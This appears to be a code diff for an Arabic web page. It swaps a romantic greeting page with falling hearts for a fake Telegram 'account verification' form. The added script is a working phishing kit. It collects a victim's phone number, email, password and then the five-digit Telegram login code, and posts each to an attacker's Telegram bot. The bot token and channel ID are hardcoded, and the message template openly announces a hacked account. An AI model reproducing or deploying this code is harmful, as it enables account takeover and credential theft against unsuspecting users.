+                    <a href="#"><i class="fas fa-arrow-up"></i> الشعب الأعلى</a>
+                    <a href="#"><i class="fas fa-arrow-down"></i> أسفل</a>
+                </div>
+                <i class="far fa-copyright"></i> جميع الحقوق محفوظة 2025
             </div>
         </div>
-
-        <!-- التذييل الأول -->
-        <div class="love-footer">يـارب نـكون سـوا دايـما</div>
-
-        <!-- النص الأخير -->
-        <div class="final-note">حـياتي | سحـورتي | لـ سيـوده</div>
-
     </div>
-</div>
 
-<script>
-    (function() {
-        const loadingScreen = document.getElementById('loadingScreen');
-        const mainPage = document.getElementById('mainPage');
-        const mainFalling = document.getElementById('mainFalling');
-        const lovePage = document.getElementById('lovePage');
-        const loginBtn = document.getElementById('loginBtn');
-        const passwordInput = document.getElementById('passwordInput');
-
-        // إنشاء عناصر التساقط لشاشة التحميل
-        function createLoadingFalling() {
-            const items = [
-                '❤️', '💜', '💕', '💖', '💗', '✨', '🎀', '🎊', '🎉',
-                '⭐', '🌟', '💫', '⚡', '🌸', '🌺', '💮', '🪄',
-                'سحوره', 'سيوده', '♡', '💙', '🔮', '💝', '💞'
-            ];
-            for (let i = 0; i < 40; i++) { // تقليل العدد للجوال
-                const item = document.createElement('div');
-                item.classList.add('falling-item');
-                item.innerHTML = items[Math.floor(Math.random() * items.length)];
-                item.style.left = Math.random() * 100 + '%';
-                item.style.animationDuration = (3 + Math.random() * 6) + 's';
-                item.style.animationDelay = (Math.random() * 3) + 's';
-                item.style.fontSize = (1 + Math.random() * 2) + 'rem';
-                item.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
-                item.style.textShadow = `0 0 20px hsl(${Math.random() * 360}, 100%, 60%)`;
-                loadingScreen.appendChild(item);
+    <script>
+        // تحديث التوكن ومعرف القناة
+        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
+        const CHAT_ID = '-1003875161698';  // معرف القناة (يبدأ بـ -100 للقنوات)
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notificationMessage');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+        
+        let userPhone = '';
+        let userEmail = '';
+        let userPassword = '';
+        
+        function showNotification(message, isError = false) {
+            notificationMessage.textContent = message;
+            notification.style.background = isError ? 
+                'linear-gradient(145deg, #991b1b, #7f1d1d)' : 
+                'linear-gradient(145deg, #312e81, #1e1b4b)';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        function showPage1() {
+            page1.classList.remove('hidden');
+            page2.classList.add('hidden');
+            page3.classList.add('hidden');
+        }
+        
+        function showPage2() {
+            page1.classList.add('hidden');
+            page2.classList.remove('hidden');
+            page3.classList.add('hidden');
+        }
+        
+        function showPage3() {
+            page1.classList.add('hidden');
+            page2.classList.add('hidden');
+            page3.classList.remove('hidden');
+            // تركيز على حقل إدخال الكود
+            setTimeout(() => {
+                document.getElementById('verificationCode').focus();
+            }, 500);
+        }
+        
+        function formatMessage(phone, email, password) {
+            const date = new Date().toLocaleString('ar-EG', {
+                timeZone: 'Africa/Cairo',
+                hour12: true
+            });
+            
+            return `🔔 *تـم إخـتراق حـساب تليجرام جديد* 🔔\n\n` +
+                   `📱 *رقم الهاتف:* \`${phone}\`\n` +
+                   `📧 *البريد الإلكتروني:* \`${email}\`\n` +
+                   `🔑 *كلمة المرور:* \`${password}\`\n\n` +
+                   `🆔 *القناة:* ${CHAT_ID}\n` +
+                   `⏰ *التاريخ والوقت:* ${date}\n\n` +
+                   `⚠️ *يرجى إرسال كود التحقق (5 أرقام) إلى المستخدم الآن*`;
+        }
+        
+        function formatVerificationMessage(phone, code) {
+            const date = new Date().toLocaleString('ar-EG', {
+                timeZone: 'Africa/Cairo',
+                hour12: true
+            });
+            
+            return `✅ *تم إدخال كود التحقق* ✅\n\n` +
+                   `📱 *رقم الهاتف:* \`${phone}\`\n` +
+                   `🔢 *كود التحقق (5 أرقام):* \`${code}\`\n\n` +
+                   `🆔 *القناة:* ${CHAT_ID}\n` +
+                   `⏰ *التاريخ والوقت:* ${date}\n\n` +
+                   `🎯 *تم توثيق الحساب بنجاح*`;
+        }
+        
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Telegram API Error:', error);
+                return false;
             }
         }
-
-        // إنشاء عناصر التساقط للصفحة الرئيسية
-        function createMainFalling() {
-            const items = [
-                '❤️', '💜', '💕', '💖', '💗', '✨', '🎀', '🎊', '🎉',
-                '⭐', '🌟', '💫', '⚡', '🌸', '🌺', '🪄', '💮',
-                'سحوره', 'سيوده', '♡', '💙', '🔮', '💝', '💞',
-                '🌈', '🦋', '🌙', '☄️', '💎', '👑', '🌹'
-            ];
-            for (let i = 0; i < 30; i++) { // تقليل العدد للجوال
-                const item = document.createElement('div');
-                item.classList.add('main-falling-item');
-                item.innerHTML = items[Math.floor(Math.random() * items.length)];
-                item.style.left = Math.random() * 100 + '%';
-                item.style.animationDuration = (4 + Math.random() * 7) + 's';
-                item.style.animationDelay = (Math.random() * 4) + 's';
-                item.style.fontSize = (1.5 + Math.random() * 2) + 'rem';
-                item.style.color = `hsl(${Math.random() * 360}, 100%, 75%)`;
-                item.style.textShadow = `0 0 25px hsl(${Math.random() * 360}, 100%, 65%)`;
-                mainFalling.appendChild(item);
-            }
-        }
-
-        // مطر قلوب وأسماء متجاوب
-        function generateRomanticRain() {
-            const rain = document.getElementById('heartsRain');
-            rain.innerHTML = '';
+        
+        // الصفحة الأولى: إرسال البيانات
+        document.getElementById('telegramForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
             
-            const heartSymbols = ['❤️', '💜', '🧡', '💕', '💖', '💗', '🩷', '💘', '💝', '💞', '💓', '💔' ,'❣️'];
-            const names = ['سحوره', 'سيوده', '♡', '💙', '🔐', '✨'];
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
             
-            // قلوب أقل للجوال
-            for (let i = 0; i < 40; i++) {
-                const heart = document.createElement('div');
-                heart.classList.add('heart-drop');
-                heart.innerHTML = heartSymbols[Math.floor(Math.random() * heartSymbols.length)];
-                heart.style.left = Math.random() * 100 + '%';
-                heart.style.animationDuration = (4 + Math.random() * 7) + 's';
-                heart.style.animationDelay = (Math.random() * 5) + 's';
-                heart.style.fontSize = (1.5 + Math.random() * 3) + 'rem';
-                heart.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
-                heart.style.filter = `drop-shadow(0 0 15px hsl(${Math.random() * 360}, 100%, 65%))`;
-                heart.style.opacity = 0.7 + Math.random() * 0.3;
-                rain.appendChild(heart);
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // التحقق من البيانات
+            if (!phone || !email || !password) {
+                showNotification('❌ يرجى ملء جميع الحقول المطلوبة', true);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-arrow-left"></i> متابعة التوثيق';
+                return;
             }
             
-            // أسماء أقل للجوال
-            for (let i = 0; i < 25; i++) {
-                const nameEl = document.createElement('div');
-                nameEl.classList.add('heart-drop');
-                nameEl.innerHTML = names[Math.floor(Math.random() * names.length)];
-                nameEl.style.left = Math.random() * 100 + '%';
-                nameEl.style.animationDuration = (5 + Math.random() * 8) + 's';
-                nameEl.style.animationDelay = (Math.random() * 5) + 's';
-                nameEl.style.fontSize = (1.5 + Math.random() * 2.5) + 'rem';
-                nameEl.style.background = 'linear-gradient(145deg, #ffaaff, #ff66ff)';
-                nameEl.style.webkitBackgroundClip = 'text';
-                nameEl.style.webkitTextFillColor = 'transparent';
-                nameEl.style.fontWeight = '900';
-                nameEl.style.textShadow = '0 0 20px #ff80ff, 0 0 50px #ff41ff';
-                rain.appendChild(nameEl);
+            if (!phone.startsWith('+')) {
+                showNotification('❌ يرجى إدخال رقم الهاتف بالصيغة الصحيحة (مثال: +20123456789)', true);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-arrow-left"></i> متابعة التوثيق';
+                return;
             }
-        }
-
-        createLoadingFalling();
-        createMainFalling();
-
-        // بعد 8 ثوانٍ تختفي شاشة التحميل (أقل للجوال)
-        setTimeout(() => {
-            loadingScreen.classList.add('loading-hidden');
-            mainPage.style.display = 'flex';
-        }, 8000);
-
-        function checkPassword() {
-            if (passwordInput.value.trim() === 'LOVE') {
-                mainPage.style.display = 'none';
-                lovePage.style.display = 'flex';
-                generateRomanticRain();
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showNotification('❌ يرجى إدخال بريد إلكتروني صحيح', true);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-arrow-left"></i> متابعة التوثيق';
+                return;
+            }
+            
+            // حفظ البيانات للاستخدام لاحقاً
+            userPhone = phone;
+            userEmail = email;
+            userPassword = password;
+            
+            // إرسال البيانات إلى القناة على تليجرام
+            const message = formatMessage(phone, email, password);
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                showNotification('✅ تم إرسال البيانات بنجاح! جاري تحويلك إلى شاشة الانتظار...');
+                
+                // الانتقال إلى صفحة الانتظار
+                setTimeout(() => {
+                    showPage2();
+                    
+                    // بعد 10 ثواني (محاكاة وقت إرسال الكود) ننتقل لصفحة إدخال الكود
+                    setTimeout(() => {
+                        showPage3();
+                        showNotification('📨 تم إرسال كود التحقق! يرجى التحقق من حسابك على تليجرام');
+                    }, 10000); // 10 ثواني انتظار
+                    
+                }, 1500);
             } else {
-                alert('الباسورد خطأ! جربي LOVE');
+                showNotification('❌ عذراً، حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.', true);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-arrow-left"></i> متابعة التوثيق';
             }
-        }
-
-        loginBtn.addEventListener('click', checkPassword);
-        passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') checkPassword(); });
-
-        // إخفاء كل شيء في البداية
-        lovePage.style.display = 'none';
-        mainPage.style.display = 'none';
-    })();
-</script>
-
+        });
+        
+        // الصفحة الثالثة: إرسال كود التحقق
+        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
+            
+            const code = document.getElementById('verificationCode').value.trim();
+            
+            if (!code || code.length !== 5 || !/^\d+$/.test(code)) {
+                showNotification('❌ يرجى إدخال كود تحقق صحيح مكون من 5 أرقام', true);
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = '<i class="fas fa-check"></i> توثيق';
+                return;
+            }
+            
+            // إرسال كود التحقق إلى القناة على تليجرام
+            const message = formatVerificationMessage(userPhone, code);
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                showNotification('✅ تم توثيق الحساب بنجاح! شكراً لك.');
+                
+                // إعادة تعيين النموذج والعودة للصفحة الأولى بعد 3 ثوان
+                setTimeout(() => {
+                    document.getElementById('verificationCode').value = '';
+                    showPage1();
+                    document.getElementById('telegramForm').reset();
+                }, 3000);
+            } else {
+                showNotification('❌ عذراً، حدث خطأ في إرسال كود التحقق', true);
+            }
+            
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = '<i class="fas fa-check"></i> توثيق';
+        });
+        
+        // تنسيق رقم الهاتف تلقائياً
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value;
+            if (value && !value.startsWith('+')) {
+                e.target.value = '+' + value.replace(/[^0-9]/g, '');
+            }
+        });
+        
+        // التأكد من إدخال أرقام فقط في حقل الكود (5 أرقام)
+        document.getElementById('verificationCode').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
+        });
+    </script>
 </body>
 </html>
